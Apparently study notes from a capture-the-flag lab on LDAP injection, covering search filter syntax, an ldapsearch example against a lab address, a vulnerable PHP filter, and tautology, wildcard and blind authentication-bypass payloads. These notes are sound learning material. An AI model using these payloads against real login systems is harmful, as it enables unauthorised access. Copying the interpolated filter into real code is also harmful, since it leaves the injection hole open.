# LDAP Injection

---

## TASK 3: LDAP Search Queries

LDAP search queries are used to locate and retrieve information from LDAP directories. Key components include:

1. **Base DN**: Starting point in the directory tree.
2. **Scope**: Depth of the search:
   - `base`: Search the base DN only.
   - `one`: Search immediate children of the base DN.
   - `sub`: Search the base DN and all descendants.
3. **Filter**: Criteria for matching entries.
4. **Attributes**: Specifies which entry details to return.

### Filters

Filters define conditions for search results. Common operators include:

- `=`: Equality
- `=*`: Presence (wildcard)
- `>=`: Greater than
- `<=`: Less than

Examples:

- `(cn=John Doe)`: Matches entries with `cn` exactly "John Doe".
- `(cn=J*)`: Matches entries where `cn` starts with "J".
- `(&(objectClass=user)(|(cn=John*)(cn=Jane*)))`: Matches users with `cn` starting with "John" or "Jane".

### Using `ldapsearch`

When LDAP services are accessible publicly, tools such as `ldapsearch` can be used to interact with the LDAP server. Example:

```bash
ldapsearch -x -H ldap://10.80.148.136:389 -b "dc=ldap,dc=thm" "(ou=People)"
```

---

## TASK 5: Exploiting LDAP

### LDAP Injection

LDAP Injection lets attackers manipulate LDAP queries, often to bypass authentication. Example vulnerable PHP code:

```php
$filter = "(&(uid=$username)(userPassword=$password))";
```

### Authentication Bypass Techniques

#### Tautology-Based Injection

Example filter:

```ldap
(&(uid={userInput})(userPassword={passwordInput}))
```

Payload:

```ldap
uid=*)(|(&)(userPassword=pwd)
```

Resulting query:

```ldap
(&(uid=*)(|(&)(userPassword=pwd)))
```

#### Wildcard Injection

Payload:

```ldap
(&(uid=*)(userPassword=*))
```

---

## TASK 6: Blind LDAP Injection

Blind LDAP Injection exploits vulnerabilities by inferring information based on application behavior, such as error messages or response timings, without direct output.

Example payload:

```ldap
(&(uid=a*)(|(&)(userPassword=pwd)))
```

---

## TASK 7: Automating the Exploitation

To automate the exfiltration of data, you can use the Python script `LDAP_exploit.py`.

---

## Appendix

---